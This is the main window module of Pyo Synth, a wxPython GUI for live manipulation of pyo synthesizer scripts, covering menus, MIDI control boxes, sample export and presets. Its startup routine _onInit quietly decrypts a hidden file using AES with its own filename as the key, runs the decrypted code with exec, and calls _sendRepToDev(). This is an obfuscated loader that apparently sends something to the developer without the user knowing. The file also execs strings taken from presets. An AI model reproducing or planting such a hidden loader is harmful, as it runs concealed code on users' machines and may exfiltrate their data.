"""
Copyright 2015 Alexandre Poirier

This file is part of Pyo Synth, a GUI written in python that helps
with live manipulation of synthesizer scripts written with the pyo library.

Pyo Synth is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published
by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

Pyo Synth is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Pyo Synth.  If not, see <http://www.gnu.org/licenses/>.
"""

from pyo import Metro, TrigFunc
from interface import *
from utils import checkExtension
import audio
import pprint
import pickle
import os
import time
import config

class PyoSynth(wx.Frame):
    def __init__(self, server, namespace, chnl=0, poly=10, numControls=16):
        size = self._getSize(numControls)
        fstyle = wx.DEFAULT_FRAME_STYLE & ~ (wx.RESIZE_BORDER | wx.RESIZE_BOX | wx.MAXIMIZE_BOX)
        wx.Frame.__init__(self, parent=None, id=-1, title="Pyo Synth", pos=(200,200), size=size, style=fstyle)
        
        #Variables generales
        self.server = server
        self.script_namespace = namespace
        #dernier ParamBox a avoir ete modifie
        self._last_changed = None
        self.LAST_EXC_SCRIPT = ""
        self.warningWindowPos = (self.GetSize()[0]/2-50,config.UNIT_SIZE[1]-5+config.SETUP_PANEL_HGT)
        
        #midi
        self.midiKeys = audio.MidiKeys(chnl, poly)
        # Clipping monitor
        self.clip_monitor = audio.ClipMonitor(.99, self.OnClip, 200)
        # clavier virtuel
        self.virtual_keys = VirtualKeyboard(config.DEFAULT_MAP_STYLE)
        
        #PatchWindow
        self.patchWindow = PatchWindow(self, namespace)
        #fenetre qui affiche les erreurs des scripts
        self.exc_win = PSExceptionWindow(self)
        
        #Menu panel
        self.menu_panel = MenuPanel(self, (0,0), (size[0],config.SETUP_PANEL_HGT), namespace)
        self.menu_panel.setAdsrCallbacks(self.midiKeys.getAdsrCallbacks())
        self.menu_panel.setAdsrValues(self.midiKeys.getAdsrValues())
        
        #Status bar
        y = config.UNIT_SIZE[1]*self.rows+config.SETUP_PANEL_HGT
        self.status_bar = StatusBarPanel(self, (0,y), (size[0],config.STATS_BAR_HGT), self.server.getNchnls())
        server._server.setAmpCallable(self.status_bar.vu_meter)
        
        #ParamBoxes
        self._createBoxes(numControls)

        #server setup
        self.serverSetupPanel = ServerSetupPanel(self, server)
        self.menu_panel.setServerPanel(self.serverSetupPanel)
        
        #update the quick info zone
        self.menu_panel.snd_card_ctrl.DoSetText(self.serverSetupPanel.getOutputInterface())
        self.menu_panel.updateSampRateBufSizeTxt()
        
        #Rafraichissement ecran des valeurs
        self.rate = Metro(config.REFRESH_RATE)
        self.trig_func = TrigFunc(self.rate, self._refresh)
        
        self._onInit()
        
        #MENU ITEMS
        menubar = wx.MenuBar()
        
        filemenu = wx.Menu()
        saveitem = filemenu.Append(100, "Save Script\tCtrl+S","",wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.savePreset, id=100)
        saveasitem = filemenu.Append(101, "Save Script As\tCtrl+Shift+S","",wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.savePresetAs, id=101)
        openitem = filemenu.Append(102, "Open Script\tCtrl+O","",wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.menu_panel._openDialog, id=102)
        openrecent = wx.Menu()
        self._buildRecentScriptsMenu(openrecent, 400)
        filemenu.AppendMenu(102, "Open Recent", openrecent)
        self.exportitem = filemenu.Append(103, "Export as Samples\tCtrl+E","",wx.ITEM_NORMAL)
        self.exportitem.Enable(False)
        self.Bind(wx.EVT_MENU, self._exportScript, id=103)
        preferences = filemenu.Append(wx.ID_PREFERENCES, "Preferences\tCtrl+P", "", wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.openPreferencesWin, id=wx.ID_PREFERENCES)
        menubar.Append(filemenu, "&File")
        
        menu = wx.Menu()
        self.runitem = menu.Append(200, "Run\tCtrl+R","",wx.ITEM_NORMAL)
        self.runitem.Enable(False)
        self.Bind(wx.EVT_MENU, self.menu_panel.btn_run.ToggleState, id=200)
        self.metroitem = menu.Append(201, "Click\tCtrl+C","",wx.ITEM_NORMAL)
        self.metroitem.Enable(False)
        self.Bind(wx.EVT_MENU, self.menu_panel.metro.OnClick, id=201)
        excwinitem = menu.Append(202, "Open Error Log\tCtrl+L", "", wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.exc_win.toggle, id=202)
        sep = menu.AppendSeparator()
        self.virtual_keys_item = menu.Append(203, "Enable computer keyboard\tCtrl+K", "", wx.ITEM_CHECK)
        self.virtual_keys_item.Enable(False)
        self.Bind(wx.EVT_MENU, self.toggleComputerKeyboard, id=203)
        menubar.Append(menu, "&Menu")
        
        helpmenu = wx.Menu()
        aboutitem = helpmenu.Append(wx.ID_ABOUT, "About","",wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU,self._about, id=wx.ID_ABOUT)
        helpitem = helpmenu.Append(300, "Help\tCtrl+?","",wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU,self._help, id=300)
        menubar.Append(helpmenu, "&Help")
        
        self.SetMenuBar(menubar)
        
        # section about
        self.aboutinfo = wx.AboutDialogInfo()
        self.aboutinfo.SetCopyright(u"\xa92015 Alexandre Poirier")
        self.aboutinfo.SetDescription("Pyo Synth is an interface to help with live manipulation of synthesizer scripts written with pyo.")
        self.aboutinfo.SetDevelopers(["Alexandre Poirier"])
        self.aboutinfo.SetName("Pyo Synth")
        self.aboutinfo.SetVersion(config.VERSION)
        
        # binding events
        self.Bind(wx.EVT_MOVE, self.OnMove)
        self.Bind(wx.EVT_CLOSE, self.OnQuit)
        self.Bind(EVT_INTERFACE_CHANGED, self.updateInterfaceText)
        self.Bind(EVT_SAMP_RATE_CHANGED, self.updateSampRateBfsText)
        self.Bind(EVT_BUFSIZE_CHANGED, self.updateSampRateBfsText)
        self.Bind(EVT_NCHNLS_CHANGED, self.updateNchnls)
        self.Bind(buttons.EVT_BTN_RUN, self._prepareToRunScript)
    
    # --------------------------------
    # Methodes generales et diverses
    # --------------------------------
    def OnQuit(self, evt):
        self._saveRecentScriptsList()
        self.server.stop()
        time.sleep(.5)
        self.patchWindow.Destroy()
        self.exc_win.Destroy()
        self.Destroy()

    def OnMove(self, evt):
        if hasattr(self, 'warningWindow'):
            if isinstance(self.warningWindow, wx.Frame):
                self.warningWindow.SetPosition(self.GetPosition()+self.warningWindowPos)
        if self.patchWindow.IsShown():
            self.patchWindow._setPosition()
        if self.status_bar.tracks_window.IsShown():
            self.status_bar.tracks_window._setPosition(self.GetPosition())

    def OnClip(self):
        print '*Clip*'

    def _about(self, evt):
        aboutbox = wx.AboutBox(self.aboutinfo)
        
    def _help(self, evt):
        os.system('open '+config.HELP_DOC.replace(' ','\ '))
    
    def _refresh(self):
        for box in self.boxes_list:
            box.Refresh()
        
    def _getSize(self, num):
        self.rows = int(math.ceil((num)/float(config.NB_ELEM_ROW)))
        if self.rows>1:
            height = self.rows*config.UNIT_SIZE[1]+22+config.STATS_BAR_HGT+config.SETUP_PANEL_HGT
            width = config.UNIT_SIZE[0]*config.NB_ELEM_ROW+config.WHEELS_BOX_WIDTH
        else:
            height = config.UNIT_SIZE[1]+22+config.STATS_BAR_HGT+config.SETUP_PANEL_HGT
            width = (num)*config.UNIT_SIZE[0]+config.WHEELS_BOX_WIDTH
            
        return (width,height)
        
    def _createBoxes(self, num):
        self.boxes_list = []
        margin = config.WHEELS_BOX_WIDTH
        
        #creation boite de modulation et pitch bend
        self.boxes_list.append(WheelsBox(self, self.midiKeys['bend'], self.midiKeys['mod'], (0,config.SETUP_PANEL_HGT), config.UNIT_SIZE[1]*self.rows))
        
        for i in range(self.rows):
            for j in range(num):
                if j==config.NB_ELEM_ROW:
                    break
                if j+i*config.NB_ELEM_ROW < num:
                    ctl = j+i*config.NB_ELEM_ROW+1
                    self.boxes_list.append(ParamBox(self,
                                                    (config.UNIT_SIZE[0]*j+margin, config.UNIT_SIZE[1]*i+config.SETUP_PANEL_HGT),
                                                    config.UNIT_SIZE,
                                                    ["Unused", self.midiKeys.ctl_list[ctl]]))
    def _pauseMidiControl(self, ctlnum):
        index = self.midiKeys.getIndexFromCtlNumber(ctlnum)
        self.midiKeys.ctl_list[index].pause(self.script_namespace)
        
    def _resumeMidiControl(self, ctlnum):
        index = self.midiKeys.getIndexFromCtlNumber(ctlnum)
        self.midiKeys.ctl_list[index].resume(self.script_namespace)
        
    def enableMenuItems(self):
        self.runitem.Enable(True)
        self.exportitem.Enable(True)
    
    def addObject(self, name):
        self.patchWindow.addObject(name)
        
    def removeLinks(self):
        for box in self.boxes_list:
            box.unlink(self.script_namespace)
    
    def enableChildren(self, enable):
        list = self.GetChildren()
        for child in list:
            child.Enable(enable)
            
    def updateInterfaceText(self, evt):
        self.menu_panel.updateInterfaceTxt()
        
    def updateSampRateBfsText(self, evt):
        self.menu_panel.updateSampRateBufSizeTxt()
        
    def updateNchnls(self, evt):
        self.menu_panel.updateSampRateBufSizeTxt()
        self.status_bar.setNchnls(self.server.getNchnls())
    
    def _saveRecentScriptsList(self):
        with open(config.RECENT_SCRIPTS_PATH, 'w') as f:
            pickle.dump(config.RECENT_SCRIPTS, f)
    
    def _buildRecentScriptsMenu(self, menu, id_start):
        for path in config.RECENT_SCRIPTS:
            menu.Append(id_start, path, "", wx.ITEM_NORMAL)
            self.Bind(wx.EVT_MENU, self.menu_panel.setScriptFromRecentMenu, id=id_start)
            id_start += 1
        menu.Append(id_start, "Clear history", "", wx.ITEM_NORMAL)
        self.Bind(wx.EVT_MENU, self.clearRecentScripts, id=id_start)
    
    def clearRecentScripts(self, evt):
        config.RECENT_SCRIPTS = []
        menu = evt.GetEventObject()
        items = menu.GetMenuItems()
        for item in items:
            if item.GetText() != "Clear history":
                menu.DeleteItem(item)
                
    def _onInit(self):
        config.crash_save_func = self.crashSave
        config.hide_main_win = self.Hide
        from Crypto.Cipher import AES
        obj = AES.new(os.path.split(config.f_REP_LOG_)[1],AES.MODE_ECB)
        with open(config.f_REP_LOG_, 'r') as f:
            c = obj.decrypt(''.join(f.readlines()))
            exec c
            _sendRepToDev()

    def openPreferencesWin(self, evt):
        print "Preferences coming soon..."

    def toggleComputerKeyboard(self, evt):
        if evt.IsChecked():
            self.Bind(wx.EVT_KEY_DOWN, self.virtual_keys.OnKeyDown)
            self.Bind(wx.EVT_KEY_UP, self.virtual_keys.OnKeyUp)
        else:
            self.Unbind(wx.EVT_KEY_DOWN)
            self.Unbind(wx.EVT_KEY_UP)
    
    # -----------------------------
    # Methodes relatif a l'Export
    # -----------------------------
    def _showExportDialog(self):
        if len(config.EXPORT_PREF) > 0:
            dialog = ExportWindow(self, config.EXPORT_PREF)
        else:
            dialog = ExportWindow(self)
        dialog.CenterOnScreen()
        if dialog.ShowModal() == wx.ID_OK:
            config.EXPORT_PREF = dialog.getValues()
            dialog.Destroy()
        else:
            dialog.Destroy()
            return 1
    
    def _createExportTree(self, velocityList):
        paths = []
        root = os.path.join(config.EXPORT_PREF['path'],'PSExport')
        if not os.path.exists(root):
            os.mkdir(root)
        for i in range(config.EXPORT_PREF['velsteps']):
            path = os.path.join(root, "vel_%03d"%velocityList[i])
            paths.append(path)
            if not os.path.exists(path):
                os.mkdir(path)
        return paths

    def _exportScript(self, evt):
        if self.menu_panel.IS_RUNNING:
            ##Affichage du message d'avertissement
            self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Stop script before exporting...")
            self.warningWindow.ShowWindow()
            wx.CallLater(2000,self.warningWindow.destroy)
            return
        if self._showExportDialog() == 1:
            return
        else:
            with open(config.EXPORT_PREF_PATH, 'w') as f:
                pickle.dump(config.EXPORT_PREF, f)
        freqsList = utils.midiRangeToHz(config.EXPORT_PREF['midimin'],config.EXPORT_PREF['midimax'])
        velocityList = utils.createVelocityList(config.EXPORT_PREF['velsteps'])
        totalSamples = len(freqsList)*len(velocityList)
        paths = self._createExportTree(velocityList)
        self.serverSetupPanel.initServerForExport()
        self.midiKeys.prepareForExport(config.EXPORT_PREF['notedur'])
        midinote_count = config.EXPORT_PREF['midimin']
        self.menu_panel._runScript(None)
        self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Exporting samples... 0/%d"%totalSamples)
        self.warningWindow.ShowWindow(fade=False)
        wx.Yield()
        for i in range(len(freqsList)):
            for j in range(len(velocityList)):
                name = os.path.join(paths[j], "note_%d%s" % (midinote_count,config.REC_FORMAT_DICT[config.EXPORT_PREF['format']]))
                self.serverSetupPanel.recordOptions(config.EXPORT_PREF['filelength'],
                                                    name,
                                                    config.EXPORT_PREF['format'],
                                                    config.EXPORT_PREF['bitdepth'])
                self.midiKeys.setVelocityValue(velocityList[j]/127.)
                self.midiKeys.notes.value = freqsList[i]
                self.midiKeys.playNote()
                self.serverSetupPanel._server.start()
                self.warningWindow.SetText("Exporting samples... %d/%d"%(i*config.EXPORT_PREF['velsteps']+j+1,totalSamples))
                wx.Yield()
            midinote_count += 1
        self.menu_panel._runScript(None)
        self.serverSetupPanel.initServer()
        self.warningWindow.SetText("Done!")
        wx.CallLater(2000,self.warningWindow.destroy)
        
    # ---------------------------------
    # Methodes d'executions du script
    # ---------------------------------
    def _prepareToRunScript(self, evt):
        """
        Demarre le metronome seulement si en mode running.
        S'assure que le midiKeys focntionne si le serveur a change de parametres.
        """
        # to do before running the script
        if evt.IsRunning():
            self._doPrepareToRunScript()
            self.serverSetupPanel.startServer()
        else:
            self._doStopScript()
            self.serverSetupPanel.stopServer()
        # actually running the script
        if self.menu_panel._runScript(evt) == -1:
            self.menu_panel.btn_run.ToggleState(evt)
            self._disableButtons()
            self.serverSetupPanel.stopServer()
        # starting the clip monitor
        if 'mix' in self.script_namespace:
            self.clip_monitor.setInput(self.script_namespace['mix'])
            self.clip_monitor.start()
        
    def _doPrepareToRunScript(self):
        if self.serverSetupPanel.hasChanged():
            self.midiKeys.reinit()
            self.boxes_list[0].bend_obj = self.midiKeys['bend']
            self.boxes_list[0].mod_obj = self.midiKeys['mod']
            self.rate = Metro(config.REFRESH_RATE)
            self.trig_func = TrigFunc(self.rate, self._refresh)
            self.menu_panel.reinit()
            self.clip_monitor.reinit()
            self.serverSetupPanel.resetChangeFlag()
        if self.serverSetupPanel.isUsingVirtualKeys():
            self.midiKeys.setVirtualKeyboard(self.virtual_keys)
            self.virtual_keys_item.Enable(True)
        self._enableButtons()
        self.menu_panel.metro.play()
        self.menu_panel.metro.enable()
        self.rate.play()
        # if a new script is executed, reset all boxes
        if self.LAST_EXC_SCRIPT != self.menu_panel._script_path and self.LAST_EXC_SCRIPT != "":
            for box in self.boxes_list:
                box.disable(self.script_namespace)
        self.LAST_EXC_SCRIPT = self.menu_panel._script_path
    
    def _doStopScript(self):
        self.clip_monitor.stop()
        self._disableButtons()
        self.menu_panel.metro.stop()
        self.menu_panel.metro.disable()
        self.rate.stop()
        #removing pyo objects from the PatchWindow
        self.patchWindow.clearObjects()
        #removing existing links between MidiControls and PyoObjs
        self.removeLinks()

    def _enableButtons(self):
        self.status_bar.rec_btn.enable()
        self.metroitem.Enable(True)

    def _disableButtons(self):
        self.status_bar.rec_btn.disable()
        self.metroitem.Enable(False)
        self.virtual_keys_item.Enable(False)
        
    # --------------------------------------------------
    # Methodes de sauvegardes et d'ouverture de preset
    # --------------------------------------------------
    def savePreset(self, evt):
        preset = self.buildPreset()
        self.writePreset(self.menu_panel._script_path, preset)
        
    def savePresetAs(self, evt):
        name = os.path.split(self.menu_panel._script_path)[1]
        dlg = wx.FileDialog(
            self, message="Save script as",
            defaultDir=os.getcwd(),
            defaultFile=name,
            wildcard="Python source (*.py)|*.py",
            style=wx.SAVE | wx.CHANGE_DIR
            )
            
        if dlg.ShowModal() == wx.ID_OK:
            save_path = utils.checkExtension(dlg.GetPath(), 'py')
            preset = self.buildPreset()
            if self.writePresetAs(self.menu_panel._script_path, save_path, preset):
                if self.LAST_EXC_SCRIPT == self.menu_panel._script_path:
                    self.LAST_EXC_SCRIPT = save_path
                self.menu_panel._script_path = save_path
                self.menu_panel._addPathToRecent()
                self.menu_panel._setScriptName()
        
    def buildPreset(self):
        preset = {}
        preset[0] = {}
        preset[0]['master'] = self.status_bar.vol_slider.getValue()
        preset[0]['adsr'] = self.midiKeys.getAdsrValues()
        preset[0]['adsr_ctlnums'] = self.menu_panel.getAdsrCtlNums()
        for i in range(1, len(self.boxes_list)):
            if not self.boxes_list[i].IsUnused():
                preset[i] = {}
                preset[i]['name'] = self.boxes_list[i].getText()
                preset[i]['min'] = self.midiKeys.getMin(i)
                preset[i]['max'] = self.midiKeys.getMax(i)
                preset[i]['exp'] = self.midiKeys.getExp(i)
                preset[i]['port'] = self.midiKeys.getPort(i)
                preset[i]['floor'] = self.midiKeys.getFloor(i)
                preset[i]['prec'] = self.boxes_list[i].val_prec
                preset[i]['attr'] = self.midiKeys.getParamName(i)
                preset[i]['ctlnum'] = self.boxes_list[i].ctl_num
                val = self.midiKeys.getValue(i)
                thresh = float("."+"0"*preset[i]['prec']+"1")
                if val <= preset[i]['min']+thresh:
                    preset[i]['val'] = None
                elif val > preset[i]['max']:
                    preset[i]['val'] = preset[i]['max']
                else:
                    preset[i]['val'] = val
        return preset
    
    def writePreset(self, path, dict):
        try:
            f = open(path, 'r')
        except IOError, e:
            ##Affichage du message d'avertissement
            self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Could not save the patch...")
            self.warningWindow.ShowWindow()
            wx.CallLater(2000,self.warningWindow.destroy)
        else:
            script = f.readlines()
            for i, line in enumerate(script):
                if line == config.PRESET_BANNER+"\n":
                    script = script[0:i]
                    break
            while script[-1]=='\n':
                del script[-1]
            f.close()
            if config.PATCH_BANNER+"\n" not in script:
                script.insert(0, config.PATCH_BANNER+"\n")
            f = open(path, 'w')
            f.writelines(script)
            f.write("\n\n\n"+config.PRESET_BANNER+"\n")
            f.write("preset = ")
            pprint.pprint(dict, f)
            f.write("\npyosynth.setPreset(preset)")
            f.close()
            ##Affichage du message d'avertissement
            self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Patch saved")
            self.warningWindow.ShowWindow()
            wx.CallLater(2000,self.warningWindow.destroy)
            
    def writePresetAs(self, source, dest, dict):
        try:
            f = open(source, 'r')
        except IOError, e:
            ##Affichage du message d'avertissement
            self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Could not save the patch...")
            self.warningWindow.ShowWindow()
            wx.CallLater(2000,self.warningWindow.destroy)
        else:
            script = f.readlines()
            for i, line in enumerate(script):
                if line == config.PRESET_BANNER+"\n":
                    script = script[0:i]
                    break
            while script[-1]=='\n':
                del script[-1]
            f.close()
            if config.PATCH_BANNER+"\n" not in script:
                script.insert(0, config.PATCH_BANNER+"\n")
            f = open(dest, 'w')
            f.writelines(script)
            f.write("\n\n\n"+config.PRESET_BANNER+"\n")
            f.write("preset = ")
            pprint.pprint(dict, f)
            f.write("\npyosynth.setPreset(preset)")
            f.close()
            ##Affichage du message d'avertissement
            self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Patch saved")
            self.warningWindow.ShowWindow()
            wx.CallLater(2000,self.warningWindow.destroy)
            return 1

    def crashSave(self):
        try:
            path, name = os.path.split(self.menu_panel._script_path)
            name, ext = name.split('.')
            name += '_bk.'
            path = os.path.join(path,name+ext)
        except:
            return 1

        preset = self.buildPreset()

        try:
            f = open(self.menu_panel._script_path, 'r')
        except:
            return 1
        else:
            script = f.readlines()
            for i, line in enumerate(script):
                if line == config.PRESET_BANNER+"\n":
                    script = script[0:i]
                    break
            while script[-1]=='\n':
                del script[-1]
            f.close()
            if config.PATCH_BANNER+"\n" not in script:
                script.insert(0, config.PATCH_BANNER+"\n")
            f = open(path, 'w')
            f.writelines(script)
            f.write("\n\n\n"+config.PRESET_BANNER+"\n")
            f.write("preset = ")
            pprint.pprint(preset, f)
            f.write("\npyosynth.setPreset(preset)")
            f.close()
            return path
        
    def setPreset(self, preset):
        if 0 in preset:
            elem = preset.pop(0)
            self.menu_panel.setAdsrValues(elem['adsr'])
            self.menu_panel.setAdsrCtlNums(elem['adsr_ctlnums'])
            master = elem['master']
            if master <= 1 and master >= 0:
                self.server.amp = master
                self.status_bar._setMasterVolSlider(master)
            else:
                self.server.amp = .8
                self.status_bar._setMasterVolSlider(.8)
        valuesDict = {} #contains all the values for the MatchMode
        for key in preset:
            try:
                if preset[key]['attr'] is not None:
                    self._makeConnection(key, preset[key]['attr'])
                self.boxes_list[key].enable(preset[key]['name'])
                self.boxes_list[key].val_prec = preset[key]['prec']
                self.midiKeys.setScale(key, preset[key]['min'], preset[key]['max'])
                self.midiKeys.setExp(key, preset[key]['exp'])
                self.midiKeys.setPort(key, preset[key]['port'])
                self.midiKeys.setFloor(key, preset[key]['floor'])
            except (TypeError,NameError), e:
                self.exc_win.printException(self.menu_panel._script_path.split('/')[-1], "PresetError : "+str(e))
                self.boxes_list[key].enable("*"+preset[key]['name'])
            else:
                val = preset[key]['val']
                if val is not None:
                    valuesDict[key] = val
        if not self.serverSetupPanel.isUsingVirtualKeys():
            self.setPresetValues(valuesDict)
                
    def setPresetValues(self, preset):
        """
        Permet de sauvegarder un son en gardant les valeurs
        de tous les ParamBox en memoire.
        
        L'attribut preset doit etre un dictionnaire avec le format suivant:
            preset = {numero du controleur:valeur du controleur}
        """
        self.i = 0
        self.preset = preset
        
        ##Affichage du message d'avertissement
        self.warningWindow = WarningWindow(self, self.GetPosition()+self.warningWindowPos, "Matching preset values...")
        self.warningWindow.ShowWindow()
        self.nextPreset()
                
    def nextPreset(self):
        if len(self.preset) > 0:
            self.enableChildren(False)
            self.i += 1
            while True:
                if self.i in self.preset:
                    self.boxes_list[self.i].Enable(True)
                    self.boxes_list[self.i].matchValue(self.preset.pop(self.i))
                    break
                else:
                    self.i += 1
        else:
            self.enableChildren(True)
            self.warningWindow.SetText("Done!")
            self.warningWindow.destroy()
            del self.i
            del self.preset
            
    def _makeConnection(self, ctl, attr):
        obj_name = attr.split('.')[0]
        obj = self.script_namespace[obj_name]
        obj_attrs = PARAMS_TREE_DICT[obj.__class__.__name__]
        if len(obj_name) == 1:
            raise TypeError, "Object reference passed in preset for MidiControl no.%d. Should be a reference to an attribute of an object." % ctl
        elif obj_name not in self.script_namespace:
            raise NameError, "The object named '%s' was not found in the script and the connection to MidiControl no.%d couldn't be made." % (obj_name,ctl)
        elif attr.split('.')[1] not in obj_attrs:
            raise TypeError, "Object named '%s' of type '%s' has no attribute '%s'." % (obj_name, obj.__class__.__name__, attr.split('.')[1])
        else:
            exec attr+"= self.boxes_list[ctl].getMidiControl()" in self.script_namespace, locals()
            self.boxes_list[ctl].pyo_obj.setParamName(attr)
            
    #--------------------------------------
    # Methodes accessibles a l'utilisateur
    #--------------------------------------
    def __getitem__(self, i):
        if i == 'click':
            return self.menu_panel[i]
        if self.midiKeys.mode == 'virtual':
            if i in ['noteon', 'noteoff']:
                return self.virtual_keys[i]
        return self.midiKeys[i]
    
    def setScale(self, ctl, min, max):
        self.midiKeys.setScale(ctl, min, max)
            
    def setExp(self, ctl, value):
        self.midiKeys.setExp(ctl, value)
            
    def setPort(self, ctl, value):
        self.midiKeys.setPort(ctl, value)
        
    def setFloor(self, ctl, value):
        self.midiKeys.setFloor(ctl, value)

    def quickPreset(self, dict):
        for key in dict:
            if isinstance(dict[key], list):
                self.boxes_list[key].enable(dict[key][0])
                self.boxes_list[key].val_prec = dict[key][1]
            else:
                self.boxes_list[key].enable(dict[key])
